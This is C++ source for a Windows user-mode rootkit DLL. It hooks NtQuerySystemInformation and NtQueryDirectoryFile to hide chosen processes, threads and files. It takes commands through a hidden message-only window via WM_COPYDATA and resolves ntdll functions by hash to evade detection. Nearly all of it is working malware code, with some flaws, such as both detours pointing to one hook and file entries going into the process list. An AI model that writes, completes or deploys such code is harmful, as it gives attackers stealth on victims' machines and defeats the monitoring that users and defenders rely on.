#include "rk.h"

#ifdef _DEBUG
namespace dbg {
	static PTOP_LEVEL_EXCEPTION_FILTER OldFilter;
	static handle                      VectorHandle;

	status CreateDumpEx(                           // Wrapper for dumpfiledirectory autocreation
		_In_opt_ EXCEPTION_POINTERS* ExceptionInfo // See CreateDump (dbg::CreateDump)
	) {
		auto Path = L"C:\\Win32.Nebula\\Minidumps";
		if (GetFileAttributesW(Path) == INVALID_FILE_ATTRIBUTES)
			if (GetLastError() == ERROR_PATH_NOT_FOUND)
				utl::CreatePath(Path);
			else
				return S_CREATE(SS_ERROR, SF_ROOTKIT, SC_UNKNOWN);
		return CreateDump(Path, ExceptionInfo);
	}

	// Incase an Exception occurs this will immediately catch it
	// and check if the Exception originates from this Module,
	// incase it does it will create a Minidumpfile and Terminate,
	// otherwise it pass control to Higher Level Filters.
	long __stdcall VMinidumpExceptionFilter(
		_In_ EXCEPTION_POINTERS* ExceptionInfo
	) {
		// Check if Expection occurred within Rootkit-Module
		ptr ExceptionAddress = (ptr)ExceptionInfo->ExceptionRecord->ExceptionAddress;
		size_t ModuleSize = utl::GetNtHeader((HMODULE)g_BaseAddress)->OptionalHeader.SizeOfImage;
		if (ExceptionAddress <= (ptr)g_BaseAddress
			|| ExceptionAddress >= (ptr)g_BaseAddress + ModuleSize)
			return EXCEPTION_CONTINUE_SEARCH;
		CreateDumpEx(ExceptionInfo);

		__fastfail((u32)-1);
		return -1;
	}
	// Incase an Excpetion makes it past the VectoredHandlers and the Process Specific ones
	// this Handler will call the original UnHandlerExceptionFilter and respond to its returnvalue
	long __stdcall UhMinidumpExceptionFilter(
		_In_ EXCEPTION_POINTERS* ExceptionInfo
	) {
		if (OldFilter) {
			long s = OldFilter(ExceptionInfo);
			if (s == EXCEPTION_CONTINUE_SEARCH)
				CreateDumpEx(ExceptionInfo);
			return s;
		} else
			CreateDumpEx(ExceptionInfo);
		return EXCEPTION_CONTINUE_SEARCH;
	}
}
#endif

namespace vec {
	// HVector (Handle Vector) is a stl like vector/array,
	// that uses handles to refer to an object instead,
	// allowing for fast traversel (which is needed for the hooks,
	// inorder to not slowdown the api'S as much as possible).
	// Each Hook will get its own (set of) Vector(s),
	// the vectors will be managed by the IO Procedure
	AnyVector::AnyVector()
		: m_Vec(VirtualAlloc(nullptr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)),
		m_Size(0x1000
	) {
	#ifdef _DEBUG
		__stosb((byte*)m_Vec, 0xcc, m_Size);
	#endif
	}
	AnyVector::~AnyVector() {
		VirtualFree(m_Vec, 0, MEM_RELEASE);
	}

	void* AnyVector::AllocateObject( // Returns a Pointer to the allocated space (valid only for limited time, see FreeObject)
		_In_ size_t Size             // The size of the Entry to be allocated
	) {
		if (Size + sizeof(Entry) > m_Size - m_Used)
			if (ResizeVector(m_Used + (Size + sizeof(Entry))))
				return nullptr; // Failed to resize

		void* mem = (void*)(m_Used + (ptr)m_Vec);
		m_Used += ((Entry*)mem)->Size = Size + sizeof(Entry);
		m_Count++;
		return (void*)((ptr)mem + sizeof(Entry));
	}
	void AnyVector::FreeObject( // Frees/Deallocates a Entry (a call will invalidate all pointers returned by Allocate Object)
		_In_ void* Object       // The Entry to be freed
	) {
		Entry* mem = (Entry*)((ptr)Object - sizeof(Entry));
		size_t nmem = mem->Size;
		__movsb((byte*)mem, (byte*)((ptr)mem + mem->Size),
			m_Used - (((ptr)mem + mem->Size) - (ptr)m_Vec));
		m_Used -= nmem;
		if (m_Used / 0x1000 < m_Size / 0x1000)
			ResizeVector(m_Used);
		m_Count--;
	}

	void* AnyVector::GetFirstEntry() { // Gets the First Entry in the Vector
		return (void*)((ptr)m_Vec + sizeof(Entry));
	}
	void* AnyVector::GetNextEntry( // Gets the next relative entry
		_In_ void* PreviousObject  // Relative Entry
	) {
		Entry* mem = (Entry*)((ptr)PreviousObject - sizeof(Entry));
		if ((((ptr)mem + mem->Size) - (ptr)m_Vec) < m_Used)
			return (void*)(((ptr)mem + mem->Size) + sizeof(Entry));
		return nullptr;
	}

	status AnyVector::ResizeVector( // Grows or Shrinks the Vector
		_In_ size_t NewSize         // Size of new Vector, will be rounded to page size
	) {
		void* mem = VirtualAlloc(nullptr, NewSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (mem) {
			__movsb((byte*)mem, (byte*)m_Vec, m_Used);
			VirtualFree(m_Vec, 0, MEM_RELEASE);
			m_Vec = mem;
			m_Size = RoundUpToMulOfPow2(NewSize, 0x1000);
		} else
			return -1; // Error reallocating Memory
		return 0;
	}

	u32 AnyVector::GetItemCount() { return m_Count; }
	void AnyVector::ReadLock() { AcquireSRWLockShared(&m_srw); }
	void AnyVector::ReadUnlock() { ReleaseSRWLockShared(&m_srw); }
	void AnyVector::WriteLock() { AcquireSRWLockExclusive(&m_srw); }
	void AnyVector::WriteUnlock() { ReleaseSRWLockExclusive(&m_srw); }
}

// RootKit Control Manager
namespace rkc {
	status RkCtlHandler(
		_In_ COPYDATASTRUCT* cds
	) {
	#define RKCTLC(fd, id) ((fd << 4) | (id & 0xf))
		switch (cds->dwData) {
		case RKCTLC(0, 0): // Add Process to Hide
		case RKCTLC(0, 1): // Add ProcessThread to Hide
			g_ProcessList->WriteLock(); {
				bool ThreadFlag = cds->dwData & 0x1;
				void* Object = g_ProcessList->AllocateObject(4 * ThreadFlag + 5);
				*(u8*)Object = ThreadFlag;
				ThreadFlag ? *(u64*)((ptr)Object + 1) = *(u64*)cds->lpData
					: *(u32*)((ptr)Object + 1) = *(u32*)cds->lpData;
			} g_ProcessList->WriteUnlock(); break;

		case RKCTLC(0, 4): // Remove Process(Thread) from Hide
			g_ProcessList->WriteLock(); {
				void* Object = (u32*)g_ProcessList->GetFirstEntry();
				do {
					if (*(u8*)Object == 0) {
						if (*(u32*)((ptr)Object + 1) == *(u32*)cds->lpData) {
							g_ProcessList->FreeObject(Object); break;
						}
					} else if (*(u8*)Object == 1)
						if (*(u32*)((ptr)Object + 5) == *(u32*)cds->lpData) {
							g_ProcessList->FreeObject(Object); break;
						}
				} while (Object = g_ProcessList->GetNextEntry(Object));
			} g_ProcessList->WriteUnlock(); break;

		case RKCTLC(1, 0): // Add File/Directory to hide
			g_ProcessList->WriteLock(); {
				void* Object = g_ProcessList->AllocateObject(cds->cbData);
				__movsb((byte*)Object, (byte*)cds->lpData, cds->cbData);
			} g_ProcessList->WriteUnlock(); break;
		case RKCTLC(1, 1): // Remove File/Directory to hide
			break;

		case RKCTLC(2, 0): // Add RegistryKey to hide
			break;
		case RKCTLC(2, 1): // Remove RegistryKey to hide
			break;

		default:
			return S_CREATE(SS_WARNING, SF_ROOTKIT, SC_UNHANDLED);
		}
	#undef RKCTLC

		return SUCCESS;
	}

	poly __stdcall MessageHandler(
		_In_     HWND hWnd,
		_In_     u32  uMsg,
		_In_opt_ poly wParam,
		_In_opt_ poly lParam
	) {
		switch (uMsg) {
		case WM_COPYDATA: // IPC Message
			return S_SUCCESS(RkCtlHandler((COPYDATASTRUCT*)lParam));

		// Message-Window Creation
		case WM_NCCREATE:
			return true;
		case WM_CREATE:
			return 0;
		}

		return DefWindowProcW(hWnd, uMsg, wParam, lParam);
	}

	struct AsyncSetupCtx {
		HINSTANCE hInstDll;
		handle    hReadEvent;
	};
	long __stdcall IOCtlSetup(
		_In_opt_ AsyncSetupCtx* ctx
	) {
		WNDCLASSEXW wc{};
		wc.cbSize = sizeof(wc);
		wc.lpfnWndProc = (WNDPROC)MessageHandler;
		wc.lpszClassName = L"rift-RootKit(rk)/process:0000";
		wc.hInstance = ctx->hInstDll;

		ATOM awc = RegisterClassExW(&wc);
		if (!awc)
			return -1;

		HWND hWnd = CreateWindowExW(NULL, (const wchar*)awc, wc.lpszClassName,
			NULL, 0, 0, 0, 0, HWND_MESSAGE, NULL, wc.hInstance, nullptr);
		if (!hWnd) {
			UnregisterClassW(wc.lpszClassName, wc.hInstance);
			return -2;
		}

		// Tell LoaderThread that the Handler is ready
		SetEvent(ctx->hReadEvent);

		MSG msg; BOOL bRet;
		while (bRet = GetMessageW(&msg, hWnd, 0, 0)) {
			if (bRet != -1)
				DispatchMessageW(&msg);
			else {
				DestroyWindow(hWnd);
				UnregisterClassW(wc.lpszClassName, wc.hInstance);
				return -3; // if a fail occurs here the server has to unload the kit/reset it
			}
		}

		UnregisterClassW(wc.lpszClassName, wc.hInstance);
		return 0;
	}
}

EXTERN_C EXPORT long __stdcall DbgSetupForLoadLib(
	_In_opt_ void* hInstDll
) {
	g_BaseAddress = hInstDll;

	// Setup IOCtl Handling (RootKit Control)
	handle h[2];
	h[0] = CreateEventW(nullptr, false, false, nullptr);
	rkc::AsyncSetupCtx ctx = { (HINSTANCE)hInstDll, h[0] };
	h[1] = CreateThread(nullptr, 0x1000, (LPTHREAD_START_ROUTINE)rkc::IOCtlSetup, &ctx, 0, nullptr);

	WaitForMultipleObjects(2, h, false, INFINITE);
	CloseHandle(h[0]);

	dword ThreadExitCode;
	GetExitCodeThread(h[1], &ThreadExitCode);
	CloseHandle(h[1]);
	if (ThreadExitCode != STILL_ACTIVE)
		return S_CREATE(SS_ERROR, SF_ROOTKIT, SC_THREAD_DIED);

	dt::DetourFunction(&(void*&)hk::NtQuerySystemInformation, hk::NtQuerySystemInformationHook, 8);
	dt::DetourFunction(&(void*&)hk::NtQueryDirectoryFile, hk::NtQuerySystemInformationHook, 8);

	return true;
}

BOOL __stdcall DllMain(
	_In_ HMODULE hinstDLL,
	_In_ dword   fdwReason,
	_In_ void*   pvReserved
) {
	UNREFERENCED_PARAMETER(pvReserved);

	switch (fdwReason) {
	case DLL_PROCESS_ATTACH:
		{
		#ifdef _DEBUG
			dbg::OldFilter = SetUnhandledExceptionFilter(dbg::UhMinidumpExceptionFilter);
			dbg::VectorHandle = AddVectoredExceptionHandler(true, dbg::VMinidumpExceptionFilter);
		#endif

			// Prepare Vectors for Operation
			g_ProcessList = new vec::AnyVector;
			g_FileList = new vec::AnyVector;

			// Get Function Addresses to Hook
			auto K32 = utl::GetModuleHandleByHash(N_NTDLL);
			hk::NtQuerySystemInformation = (nt::NtQuerySystemInformation_t)
				utl::ImportFunctionByHash(K32, N_NTQUERYSI);
			hk::NtQueryDirectoryFile = (nt::NtQueryDirectoryFile_t)
				utl::ImportFunctionByHash(K32, N_NTQUERYDF);

			return true;
		}
	case DLL_PROCESS_DETACH:
		// Clean Vectors
		delete g_ProcessList;
		delete g_FileList;

	#ifdef _DEBUG
		SetUnhandledExceptionFilter(dbg::OldFilter);
		RemoveVectoredExceptionHandler(dbg::VectorHandle);
	#endif

		return SUCCESS;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}

	return S_CREATE(SS_WARNING, SF_ROOTKIT, SC_UNHANDLED);
}
